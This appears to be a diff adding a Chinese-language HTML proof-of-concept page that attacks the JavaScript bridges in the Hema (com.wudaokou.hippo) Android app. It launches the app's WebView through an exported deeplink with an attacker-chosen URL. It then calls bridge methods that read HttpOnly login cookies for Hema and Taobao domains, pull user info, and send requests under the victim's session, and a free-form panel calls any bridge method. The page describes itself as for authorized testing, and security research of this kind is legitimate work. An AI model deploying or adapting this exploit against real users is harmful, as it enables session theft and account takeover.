@@ -1,0 +1,161 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>闲鱼… 盒马 (com.wudaokou.hippo) PHA 桥探测 probe</title>
+<style>
+  :root{--bg:#0b0b0c;--card:#151517;--fg:#e6e6e6;--dim:#999;--green:#3fdb6b;--yellow:#ffd000;--red:#ff6b6b;--blue:#79c0ff}
+  *{box-sizing:border-box}
+  body{font-family:-apple-system,Roboto,sans-serif;margin:0;padding:12px;background:var(--bg);color:var(--fg);font-size:14px}
+  h1{font-size:16px;margin:6px 0 4px}
+  .sub{color:var(--dim);font-size:12px;line-height:1.5;margin-bottom:10px}
+  .card{background:var(--card);border-radius:10px;padding:12px;margin-bottom:12px}
+  .card h2{font-size:13px;margin:0 0 4px}
+  .desc{color:var(--dim);font-size:11.5px;margin-bottom:8px;line-height:1.45}
+  button{background:var(--yellow);color:#3a3a00;border:0;border-radius:7px;padding:9px 13px;font-size:12.5px;margin:3px 5px 3px 0;font-weight:600;cursor:pointer}
+  button:active{opacity:.7}
+  button.crown{background:var(--red);color:#fff}
+  button.crit{background:#a371f7;color:#fff}
+  a.golink{display:inline-block;background:var(--blue);color:#04122b;text-decoration:none;border-radius:7px;padding:9px 13px;font-size:12.5px;margin:3px 5px 3px 0;font-weight:600}
+  pre{background:#000;color:var(--green);padding:9px;border-radius:7px;font-size:11px;white-space:pre-wrap;word-break:break-all;max-height:240px;overflow:auto;margin:6px 0 0}
+  pre.dl{color:var(--blue)}
+  .badge{display:inline-block;border-radius:4px;padding:1px 6px;font-size:10.5px;margin-left:6px;background:#333;color:#aaa}
+  .badge.ok{background:#0c3a1c;color:#3fdb6b}.badge.bad{background:#3a1414;color:#ff6b6b}.badge.wait{background:#3a320c;color:#ffd000}
+  input{width:100%;padding:7px;border:1px solid #444;background:#0e0e10;color:var(--fg);border-radius:6px;font-size:12px;margin-top:4px}
+  label{font-size:11.5px;color:var(--dim);display:block;margin-top:6px}
+  code{background:#222;border-radius:3px;padding:0 4px;font-size:11px;word-break:break-all}
+</style>
+</head>
+<body>
+<h1>盒马 (com.wudaokou.hippo) PHA 桥探测 <span class="badge">probe · 手动</span></h1>
+<div class="sub">
+框架 = 自研 <b>pha</b>（桥 <code>__pha_bridge_engine__</code>，回调 <code>__pha_native_to_js__(cbId,err,data)</code>）+ 底层 WindVane（<code>__windvane__</code>，pha 的 <code>WindVane.call</code> 转发到底层）。<br>
+<b>不自动触发任何桥</b>（仅环境检测自动）。逐个手点。段2 注入闸 = host 后缀白名单（<code>endsWith(".hemaos.com")</code> 等，<code>android.net.Uri.getHost()</code> 真 host，抗 parser-diff）——需初始 URL host 过后缀白名单（你已能绕过），桥才注入。段3 pha 桥无 per-call origin 校验；WindVane 取值来源 = 内核 getUrl()。结果写 DOM，仅授权测试。
+</div>
+
+<!-- 环境检测：唯一自动跑 -->
+<div class="card">
+  <h2>环境 <span id="env_b" class="badge wait">检测中</span></h2>
+  <div class="desc">检测 pha 桥是否注入 + 当前 origin。桥不在 = 初始 URL 未过后缀白名单（段2 未注入）。</div>
+  <pre id="out_env">—</pre>
+</div>
+
+<!-- 发射器：段1 载入 -->
+<div class="card">
+  <h2>⓪ 发射器 — deeplink 进 pha 容器（段1 载入）</h2>
+  <div class="desc">
+    入口 = <code>DispatchActivity</code>(exported，<code>wdkhema://main</code> + AppLink <code>h5.hemaos.com/main</code>)。<br>
+    ★正确形态 = <code>wdkhema://main?url=&lt;目标&gt;</code>（<code>main</code> 固定 host/path，目标放 <code>url</code> 参数）。<b>目标 url 你原样填，代码不加工</b>（不 strip / 不补 // / 不拼尾巴）。<br>
+    要拿到桥，目标 URL 的 host 需过后缀白名单（<code>*.hemaos.com</code>）——填盒马自有域页面，或用你绕过注入闸的形态。
+  </div>
+  <label>目标 URL（原样组装，代码不加工）
+    <input id="turl" oninput="buildDeep()" value="https://h5.hemaos.com/main"></label>
+  <a id="golink" class="golink" href="#">拉起 wdkhema://main?url=…</a>
+  <pre id="out_dl" class="dl">—</pre>
+  <pre id="out_adb">—</pre>
+</div>
+
+<!-- crown 卡 -->
+<div class="card">
+  <h2>A. 读登录 Cookie · WVCookie.readCookies <span class="badge" style="background:#3a1414;color:#ff6b6b">crown/ATO</span></h2>
+  <div class="desc">经 pha→WindVane 转发到底层 <code>__windvane__</code>。读含 HttpOnly 会话 Cookie。url 指盒马/淘宝域。</div>
+  <button class="crown" onclick="wv('WVCookie','readCookies',{url:'https://www.hemaos.com'},'A')">readCookies(hemaos.com)</button>
+  <button class="crown" onclick="wv('WVCookie','readCookies',{url:'https://www.taobao.com'},'A2')">readCookies(taobao.com)</button>
+  <pre id="outA">—</pre><pre id="outA2">—</pre>
+</div>
+
+<div class="card">
+  <h2>B. 用户信息 · pha user.getUserInfo <span class="badge" style="background:#3a1414;color:#ff6b6b">crown</span></h2>
+  <div class="desc">pha 原生桥。返回用户信息 / uid。</div>
+  <button class="crown" onclick="ph('user','getUserInfo',{},'B')">user.getUserInfo</button>
+  <pre id="outB">—</pre>
+</div>
+
+<div class="card">
+  <h2>C. 带登录态 mtop · MtopWVPlugin.send <span class="badge" style="background:#3a1414;color:#ff6b6b">crown</span></h2>
+  <div class="desc">经 WindVane 转发，带受害者 session 发 mtop。此处仅无害只读 API 探可达性（不填敏感 API）。</div>
+  <button class="crown" onclick="wv('MtopWVPlugin','send',{api:'mtop.common.getTimestamp',v:'1.0',needLogin:false,data:{}},'C')">mtop.send(无害探测)</button>
+  <pre id="outC">—</pre>
+</div>
+
+<!-- 通用调用 -->
+<div class="card">
+  <h2>Z. 自由调用</h2>
+  <div class="desc">pha：<code>模块.方法</code>（如 user.getUserInfo）。WindVane 转发：obj/func/param。参数原样 JSON。</div>
+  <label>方式
+    <input id="zmode" value="pha" placeholder="pha 或 wv"></label>
+  <label>pha 模块 / wv obj<input id="zobj" value="user"></label>
+  <label>pha 方法 / wv func<input id="zfunc" value="getUserInfo"></label>
+  <label>参数 JSON<input id="zparam" value="{}"></label>
+  <button onclick="freeCall()">发一次</button>
+  <pre id="outZ">—</pre>
+</div>
+
+<script>
+var PHA = "__pha_bridge_engine__";
+var seq = 0;
+function log(id,o){var e=document.getElementById(id);e.textContent='['+new Date().toLocaleTimeString()+']\n'+((typeof o==='string')?o:JSON.stringify(o,null,2));}
+function setBadge(id,cls,txt){var e=document.getElementById(id);e.className='badge '+cls;e.textContent=txt;}
+
+// pha 回调：native 调 __pha_native_to_js__(callbackId, err, data)。这里 callbackId = DOM id
+window.__pha_native_to_js__ = function(id, err, data){
+  var el = document.getElementById(id);
+  if(el) el.textContent='[回 '+new Date().toLocaleTimeString()+']\nerr='+err+'\ndata='+data;
+};
+
+// pha 原生调用：__pha_bridge_engine__.call(module, method, paramsJSON, callbackId)
+function ph(module, method, params, outId){
+  var eng = window[PHA];
+  if(!eng || typeof eng.call!=='function'){ log(outId, PHA+' 不存在——桥未注入（段2 未过后缀白名单?）'); setBadge('env_b','bad','无桥'); return; }
+  try{
+    log(outId, '发起 pha '+module+'.'+method+' cbId='+outId+' …');
+    eng.call(module, method, JSON.stringify(params||{}), outId);
+  }catch(e){ log(outId, 'EXC '+e); }
+}
+// 经 pha WindVane.call 转发到底层 __windvane__
+function wv(obj, method, params, outId){
+  ph('WindVane','call', {obj:obj, func:method, param:params}, outId);
+}
+function freeCall(){
+  var mode=document.getElementById('zmode').value.trim();
+  var obj=document.getElementById('zobj').value.trim();
+  var func=document.getElementById('zfunc').value.trim();
+  var param=document.getElementById('zparam').value.trim()||'{}';
+  if(mode==='wv'){ wv(obj, func, param, 'Z'); }
+  else { ph(obj, func, param, 'Z'); }
+}
+
+// 环境检测（唯一自动跑）
+(function(){
+  var tries=0;
+  (function poll(){
+    tries++;
+    var eng=window[PHA];
+    log('out_env',{
+      'PHA桥 __pha_bridge_engine__': typeof eng,
+      'call方法': eng?(typeof eng.call):'n/a',
+      '底层 __windvane__': typeof window.__windvane__,
+      'location.origin': location.origin,
+      'location.href': location.href
+    });
+    if(eng && typeof eng.call==='function'){ setBadge('env_b','ok','桥已注入'); return; }
+    if(tries>40){ setBadge('env_b','bad','无桥'); log('out_env','PHA 桥 6s 未出现——初始 URL 未过后缀白名单（段2 未注入），或非 pha 容器'); return; }
+    setTimeout(poll,150);
+  })();
+})();
+
+
+function buildDeep(){
+  var turl = document.getElementById('turl').value;   // 原样，不 trim / 不 strip / 不补 // / 不拼尾巴
+  var enc  = encodeURIComponent(turl);
+  var raw  = 'wdkhema://main?url=' + enc;
+  var raw2 = 'https://h5.hemaos.com/main?url=' + enc;   // AppLink 等价形态
+  document.getElementById('golink').href = raw;
+  log('out_dl', 'deeplink(原样组装):\n'+raw+'\n\nAppLink 等价:\n'+raw2);
+}
+document.getElementById('golink').addEventListener('click',function(){ log('out_dl','已发起: '+this.getAttribute('href')); });
+buildDeep();
+</script>
+</body>
+</html>
